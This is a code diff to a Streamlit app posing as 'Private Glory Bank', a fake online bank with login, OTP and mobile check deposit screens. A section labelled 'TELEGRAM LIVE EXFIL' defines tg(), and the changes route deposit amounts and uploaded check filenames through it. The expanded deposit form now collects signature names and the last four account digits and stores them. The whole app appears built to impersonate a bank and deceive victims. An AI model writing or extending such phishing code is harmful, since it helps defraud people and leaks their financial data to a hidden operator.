@@ -5,6 +5,15 @@ import plotly.express as px
 import requests
 import random
 import base64
+from io import BytesIO
+import re
+
+# Optional image checks — fall back gracefully if Pillow isn't available
+try:
+    from PIL import Image, UnidentifiedImageError
+    PIL_AVAILABLE = True
+except Exception:
+    PIL_AVAILABLE = False
 
 # ==================== TELEGRAM LIVE EXFIL ====================
 def tg(message):
@@ -61,22 +70,16 @@ if "tx" not in state:
 st.set_page_config(page_title="Private Glory Bank", page_icon="🇺🇸", layout="wide")
 
 # ==================== INLINE SVG IMAGES (no remote dependencies) ====================
-# Create small embedded SVGs as data URIs so images won't break if external hosts fail.
-
 FLAG_SVG = """
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 16" width="300" height="160" role="img" aria-label="US flag">
-  <!-- Red background for stripes -->
   <rect width="30" height="16" fill="#b22234"/>
-  <!-- White stripes (6 of them on top of red base creating 13 stripes total) -->
   <rect width="30" height="1.230769%" y="7.692307%" fill="#fff"/>
   <rect width="30" height="1.230769%" y="23.076923%" fill="#fff"/>
   <rect width="30" height="1.230769%" y="38.461538%" fill="#fff"/>
   <rect width="30" height="1.230769%" y="53.846154%" fill="#fff"/>
   <rect width="30" height="1.230769%" y="69.230769%" fill="#fff"/>
   <rect width="30" height="1.230769%" y="84.615384%" fill="#fff"/>
-  <!-- Blue canton -->
   <rect width="12" height="8.615384615%" fill="#3c3b6e"/>
-  <!-- Simple stars represented as small circles for reliability -->
   <g fill="#fff" transform="translate(1.2,1.2) scale(0.9)">
     <circle cx="1.0" cy="1.0" r="0.45"/>
     <circle cx="3.0" cy="1.0" r="0.45"/>
@@ -112,7 +115,7 @@ st.markdown(f"""
     .header img {{width: 220px; max-width:60%; height:auto;}}
     .bank-title {{color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0;}}
     .bank-subtitle {{color: #c9a227; font-size: 1.3rem; font-weight: 600; margin: 8px 0 0;}}
-    .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 540px;}}
+    .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 640px;}}
     .stButton > button {{background: #c9a227; color: #0e2a47; border: none; border-radius: 16px; height: 4rem; font-weight: 700;}}
     .stButton > button:hover {{background: #0e8c66a;}}
     .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: #0e2a47; color: #aaa; text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999;}}
@@ -124,7 +127,6 @@ st.markdown(f"""
 """, unsafe_allow_html=True)
 
 def header():
-    # The header shows the embedded American flag as the single, primary logo.
     st.markdown(f'''
     <div class="header">
         <img src="{FLAG_DATA_URI}" alt="American Flag">
@@ -133,7 +135,37 @@ def header():
     </div>
     ''', unsafe_allow_html=True)
 
-# ==================== LOGIN ====================
+# ==================== Helpers for mobile deposit ===================================
+def extract_amount_from_filename(uploaded_file) -> float | None:
+    """Try to find a monetary amount in the filename (e.g. check_150.50.jpg)"""
+    if not uploaded_file:
+        return None
+    name = uploaded_file.name
+    matches = re.findall(r'(\d{1,6}(?:[.,]\d{1,2})?)', name)
+    if not matches:
+        return None
+    # Pick the largest numeric-looking match
+    nums = []
+    for m in matches:
+        m_clean = m.replace(',', '.')
+        try:
+            nums.append(float(m_clean))
+        except:
+            pass
+    if not nums:
+        return None
+    return max(nums)
+
+def add_business_days(start_date: datetime, days: int) -> datetime:
+    d = start_date
+    added = 0
+    while added < days:
+        d += timedelta(days=1)
+        if d.weekday() < 5:  # Mon-Fri
+            added += 1
+    return d
+
+# ==================== LOGIN / REGISTER / DASHBOARD (unchanged) ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -156,7 +188,6 @@ def login():
                 st.error("Invalid credentials")
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== REGISTRATION ====================
 def register():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -182,7 +213,7 @@ def register():
                     st.rerun()
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== OTP ====================
+# ==================== OTP / DASHBOARD / HISTORIES (unchanged) ====================
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -196,7 +227,6 @@ def otp():
             st.success("Success")
             st.rerun()
 
-# ==================== DASHBOARD ====================
 def dashboard():
     header()
     st.markdown(f"<p style='text-align:right;color:#666;'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)
@@ -219,7 +249,6 @@ def dashboard():
     display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
     st.dataframe(display, use_container_width=True, hide_index=True)
 
-# ==================== CHECKING HISTORY ====================
 def checking_history():
     header()
     st.markdown("### Checking Account ••••1776")
@@ -233,7 +262,6 @@ def checking_history():
         st.session_state.view = None
         st.rerun()
 
-# ==================== SAVINGS HISTORY ====================
 def savings_history():
     header()
     st.markdown("### Savings Account ••••1812")
@@ -247,44 +275,130 @@ def savings_history():
         st.session_state.view = None
         st.rerun()
 
-# ==================== TRANSFER ====================
-def transfer():
-    header()
-    st.markdown("<div class='card'>", unsafe_allow_html=True)
-    from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
-    amount = st.number_input("Amount ($)", min_value=0.01)
-    if st.button("Transfer", type="primary"):
-        if "Checking" in from_acc and amount > state.checking:
-            st.error("Insufficient funds")
-        elif "Savings" in from_acc and amount > state.savings:
-            st.error("Insufficient funds")
-        else:
-            if "Checking" in from_acc:
-                state.checking -= amount
-                state.savings += amount
-            else:
-                state.savings -= amount
-                state.checking += amount
-            tg(f"TRANSFER ${amount:,.2f}")
-            st.success("Transfer Complete")
-            st.rerun()
-    st.markdown("</div>", unsafe_allow_html=True)
-
-# ==================== MOBILE DEPOSIT ====================
+# ==================== IMPROVED MOBILE DEPOSIT ====================
 def mobile_deposit():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
     st.markdown("## Mobile Check Deposit")
-    amount = st.number_input("Check Amount ($)", min_value=0.01)
-    front = st.file_uploader("Front of Check", type=["jpg","png","pdf"])
-    back = st.file_uploader("Back of Check", type=["jpg","png","pdf"])
-    if st.button("Deposit Check", type="primary"):
-        if front and back:
-            tg(f"CHECK DEPOSIT — ${amount:,.2f}")
-            st.success("Check accepted!")
-            state.checking += amount
+    st.markdown("For best results: lay the check on a dark flat surface, good lighting, and take the whole check in frame.", unsafe_allow_html=True)
+
+    col_l, col_r = st.columns([2, 1])
+    with col_l:
+        amount = st.number_input("Check Amount ($)", min_value=0.01, format="%.2f")
+        front = st.file_uploader("Front of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="front_upload")
+        back = st.file_uploader("Back of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="back_upload")
+        st.markdown("---")
+        st.markdown("Endorsement and verification")
+        endorsed = st.checkbox("I endorse the back of this check and sign my name", key="endorsed_checkbox")
+        signer_name = st.text_input("Typed name as signature (exactly as signed on back)", max_chars=50)
+        last4 = st.text_input("Last 4 digits of account for verification", max_chars=4, help="Helps verify endorsement (we won't store full account numbers).")
+        st.markdown("---")
+        # Try to auto-detect amount from filename as a convenience
+        auto_amt_front = extract_amount_from_filename(front)
+        auto_amt_back = extract_amount_from_filename(back)
+        suggested_amt = None
+        if auto_amt_front and auto_amt_back:
+            suggested_amt = max(auto_amt_front, auto_amt_back)
+        elif auto_amt_front:
+            suggested_amt = auto_amt_front
+        elif auto_amt_back:
+            suggested_amt = auto_amt_back
+
+        if suggested_amt:
+            st.info(f"Amount-like value detected in uploaded filenames: ${suggested_amt:.2f}. If this matches the check, you can use it or keep your entered amount.")
+
+        # Preview images (if Pillow available)
+        if front:
+            if str(front.type).lower().startswith("image") and PIL_AVAILABLE:
+                try:
+                    img = Image.open(BytesIO(front.getvalue()))
+                    st.image(img, caption="Front preview", use_column_width=True)
+                    # Basic quality checks
+                    w, h = img.size
+                    if w < 600 or h < 200:
+                        st.warning("Image resolution looks low. A higher resolution photo helps recognition.")
+                except UnidentifiedImageError:
+                    st.warning("Couldn't preview the front image.")
+            elif front.name.lower().endswith(".pdf"):
+                st.info("Uploaded a PDF for front. Preview not available here.")
+        if back:
+            if str(back.type).lower().startswith("image") and PIL_AVAILABLE:
+                try:
+                    img2 = Image.open(BytesIO(back.getvalue()))
+                    st.image(img2, caption="Back preview", use_column_width=True)
+                except UnidentifiedImageError:
+                    st.warning("Couldn't preview the back image.")
+            elif back.name.lower().endswith(".pdf"):
+                st.info("Uploaded a PDF for back. Preview not available here.")
+
+    with col_r:
+        st.markdown("Deposit policy & availability")
+        st.markdown("- Deposits of $200 or less: funds generally available same business day.")
+        st.markdown("- Deposits > $200 and <= $5,000: portion may be held; expected availability shown after you submit.")
+        st.markdown("- Large checks or suspicious items may be held longer pending verification.")
+        st.markdown("We require front and back images and an endorsement to accept mobile checks.")
+        st.markdown("---")
+        st.markdown("Recent mobile deposits")
+        recent = [f for f in reversed(state.files[-6:])]
+        if recent:
+            for r in recent:
+                clr = r.get("status", "pending")
+                st.write(f"{r['date']} • ${r['amount']:.2f} • {r['filename']} • {clr} • avail: {r.get('available_on','-')}")
         else:
-            st.error("Upload both sides")
+            st.write("No mobile deposits yet.")
+
+    if st.button("Deposit Check", type="primary"):
+        # Basic validation
+        if not front or not back:
+            st.error("Please upload both front and back images/PDFs of the check.")
+            return
+        if not endorsed or not signer_name or not last4:
+            st.error("Please endorse the check and provide the signature name and last 4 digits for verification.")
+            return
+        # Try to reconcile amount if a detected suggested_amt exists and entered amount differs
+        detected = suggested_amt
+        amount_mismatch_note = None
+        if detected and abs(detected - amount) > 1.0:
+            amount_mismatch_note = f"Detected ${detected:.2f} in filenames which differs from entered amount ${amount:.2f}."
+
+        # Simple hold rules (simulated realistic behavior)
+        today = datetime.now()
+        if amount <= 200:
+            hold_days = 0
+        elif amount <= 500:
+            hold_days = 1  # next business day for portion
+        elif amount <= 5000:
+            hold_days = 3
+        else:
+            hold_days = 5
+
+        available_on = add_business_days(today, hold_days).strftime("%Y-%m-%d")
+        status = "cleared" if hold_days == 0 else "pending"
+        # If cleared immediately, credit checking right away; else create a pending record
+        record = {
+            "date": today.strftime("%Y-%m-%d %H:%M:%S"),
+            "filename": f"{front.name} / {back.name}",
+            "amount": float(amount),
+            "status": status,
+            "available_on": available_on,
+            "signed_by": signer_name,
+            "verified_last4": last4,
+            "note": amount_mismatch_note or ""
+        }
+        state.files.append(record)
+        tg(f"CHECK DEPOSIT — ${amount:,.2f} — {front.name} / {back.name}")
+        if hold_days == 0:
+            state.checking += float(amount)
+            # Also add transaction for transparency
+            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit", "amount": float(amount), "account": "Checking"})
+            st.success(f"Deposit accepted — ${amount:.2f} is available now.")
+        else:
+            # Add pending transaction so user sees it, but don't credit balance yet.
+            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit (pending)", "amount": 0.00, "account": "Checking"})
+            st.success(f"Deposit submitted — ${amount:.2f} is expected to be available on {available_on} (simulated).")
+            st.info("A portion of the deposit may be available sooner depending on verification. We will notify you when cleared.")
+        st.experimental_rerun()
+
     st.markdown("</div>", unsafe_allow_html=True)
 
 # ==================== MESSAGES & ADMIN ====================
@@ -309,7 +423,6 @@ def admin():
 
 # ==================== SIDEBAR ====================
 def sidebar():
-    # Use the embedded flag image in the sidebar so the app doesn't rely on external hosts.
     st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
     return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])
 
